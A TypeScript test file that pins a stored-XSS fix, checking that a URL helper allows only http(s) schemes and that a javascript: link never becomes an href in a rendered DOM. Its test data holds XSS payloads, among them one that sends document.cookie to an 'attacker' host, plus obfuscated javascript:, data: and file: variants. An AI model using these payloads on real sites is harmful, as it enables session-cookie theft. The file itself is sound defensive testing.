/**
 * Pins for the client-side half of the stored-XSS fix.
 *
 * The server now rejects non-http(s) schemes at the write boundary, but rows
 * written before that check existed are still in the database and are returned
 * verbatim, so the render path has to re-check.
 */
import { existsSync, readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { JSDOM } from 'jsdom';
import { safeHref } from './safe-url.js';

/**
 * Resolve web/src. These tests are compiled into .tmp-test/ before running, so
 * import.meta.url points at the build output, not at the sources. Walk up to the
 * directory holding package.json and take src/ from there, which works whether
 * this runs from src/ or from .tmp-test/.
 */
function sourceRoot(): string {
  let dir = fileURLToPath(new URL('.', import.meta.url));
  while (!existsSync(join(dir, 'package.json'))) {
    const parent = dirname(dir);
    if (parent === dir) throw new Error('could not locate web/package.json from ' + import.meta.url);
    dir = parent;
  }
  return join(dir, 'src');
}

function assert(condition: boolean, message: string): void {
  if (!condition) throw new Error(message);
}

const XSS = "javascript:fetch('//attacker/'+document.cookie)";

/**
 * Every one of these must be refused. Note that several are NOT rejected by
 * Go's net/url (which errors on control characters) but ARE normalised by the
 * WHATWG URL parser the browser and this helper use: `new URL('java\tscript:x')`
 * yields protocol 'javascript:'. That divergence is exactly why this has to be
 * an allow-list on the parsed scheme rather than a denylist on the raw string.
 */
function testRejectsUnsafeSchemes(): void {
  const rejected: ReadonlyArray<readonly [string, string]> = [
    ['javascript', 'javascript:alert(1)'],
    ['javascript exfiltration', XSS],
    ['javascript mixed case', 'JaVaScRiPt:alert(1)'],
    ['javascript upper case', 'JAVASCRIPT:alert(1)'],
    ['leading tab', '\tjavascript:alert(1)'],
    ['leading newline', '\njavascript:alert(1)'],
    ['leading space', ' javascript:alert(1)'],
    ['embedded tab', 'java\tscript:alert(1)'],
    ['embedded newline', 'java\nscript:alert(1)'],
    ['embedded carriage return', 'java\rscript:alert(1)'],
    ['data html', 'data:text/html,<script>alert(1)</script>'],
    ['data base64', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
    ['vbscript', 'vbscript:msgbox(1)'],
    ['blob', 'blob:https://example.com/uuid'],
    ['file', 'file:///etc/passwd'],
    // mailto: is a deliberate rejection, not an oversight: the server's
    // allow-list rejects it too, so rendering it would be dead code.
    ['mailto', 'mailto:a@b.com'],
    // Relative and protocol-relative inputs are rejected because there is no
    // base argument. With one, '//evil.com/x' would become an ACCEPTED
    // 'https://evil.com/x'.
    ['protocol relative', '//evil.com/x'],
    ['absolute path', '/relative/path'],
    ['bare word', 'not-a-url'],
    ['http without host', 'http://'],
    ['empty', ''],
  ];

  for (const [name, input] of rejected) {
    assert(
      safeHref(input) === undefined,
      `safeHref(${JSON.stringify(input)}) should be undefined for "${name}", got ${JSON.stringify(safeHref(input))}`,
    );
  }

  assert(safeHref(undefined) === undefined, 'safeHref(undefined) should be undefined');
  assert(safeHref(null) === undefined, 'safeHref(null) should be undefined');
}

function testAcceptsHTTPAndHTTPS(): void {
  const accepted: readonly string[] = [
    'https://github.com/o/r/pull/1',
    'http://example.com/x',
    'HtTpS://example.com',
    'https://example.com:8443/x',
    'https://example.com/x?a=1&b=2#frag',
    'https://user:pass@example.com/x',
  ];
  for (const input of accepted) {
    assert(
      safeHref(input) === input,
      `safeHref(${JSON.stringify(input)}) should return the input unchanged, got ${JSON.stringify(safeHref(input))}`,
    );
  }
}

/**
 * The behavioural pin the brief asks for: a persisted javascript: URL must not
 * reach the href attribute of a real DOM node.
 *
 * This renders through JSDOM and reads the attribute back, rather than asserting
 * on a string, so it measures what the DOM ends up holding.
 */
function testPayloadNeverReachesHrefAttribute(): void {
  const dom = new JSDOM('<!doctype html><body><div id="host"></div></body>');
  const doc = dom.window.document;
  const host = doc.getElementById('host')!;

  // Mirrors the guarded shape used by ft-inspector-code.ts and
  // ft-inspector-meta.ts: link when safeHref accepts, inert span when it does not.
  const renderGuarded = (raw: string): void => {
    const href = safeHref(raw);
    if (href === undefined) {
      const span = doc.createElement('span');
      span.textContent = raw;
      host.replaceChildren(span);
    } else {
      const a = doc.createElement('a');
      a.setAttribute('href', href);
      a.setAttribute('target', '_blank');
      a.setAttribute('rel', 'noopener');
      a.textContent = 'link';
      host.replaceChildren(a);
    }
  };

  renderGuarded(XSS);
  assert(host.querySelector('a') === null, 'a javascript: URL must not produce an anchor at all');
  assert(
    !host.innerHTML.includes('href'),
    `no href attribute should be emitted, got: ${host.innerHTML}`,
  );
  // Degrade, do not drop: the value stays visible to the user as inert text.
  assert(
    host.textContent === XSS,
    `rejected URL should remain visible as text, got: ${host.textContent}`,
  );

  // Positive control for this harness: the identical render path DOES produce an
  // href for a legitimate URL. Without this, an assertion of "no href" would
  // pass even if renderGuarded were silently broken and rendered nothing ever.
  const good = 'https://github.com/o/r/pull/1';
  renderGuarded(good);
  const anchor = host.querySelector('a');
  assert(anchor !== null, 'positive control: a legitimate https URL must produce an anchor');
  assert(
    anchor!.getAttribute('href') === good,
    `positive control: href should be ${good}, got ${anchor!.getAttribute('href')}`,
  );
}

/**
 * target="_blank" is currently an incidental mitigation on both anchors: engines
 * block javascript: navigation into a new browsing context, but nothing pinned
 * that attribute, so removing it would quietly change the severity of any URL
 * that slipped past the scheme checks. This pins it.
 */
function testExternalAnchorsKeepTargetBlank(): void {
  const files = [
    'components/inspector/ft-inspector-code.ts',
    'components/inspector/ft-inspector-meta.ts',
  ];
  const src = sourceRoot();

  for (const rel of files) {
    const text = readFileSync(join(src, rel), 'utf8');
    const anchors = text.split('\n').filter((l) => l.includes('href=${href}'));
    assert(anchors.length > 0, `${rel}: expected a guarded href=\${href} anchor, found none`);
    for (const line of anchors) {
      assert(
        line.includes('target="_blank"'),
        `${rel}: guarded anchor lost target="_blank": ${line.trim()}`,
      );
      assert(
        line.includes('rel="noopener"'),
        `${rel}: guarded anchor lost rel="noopener": ${line.trim()}`,
      );
    }
  }
}

function run(): void {
  testRejectsUnsafeSchemes();
  testAcceptsHTTPAndHTTPS();
  testPayloadNeverReachesHrefAttribute();
  testExternalAnchorsKeepTargetBlank();
  console.log('safe-url: ok');
}

run();
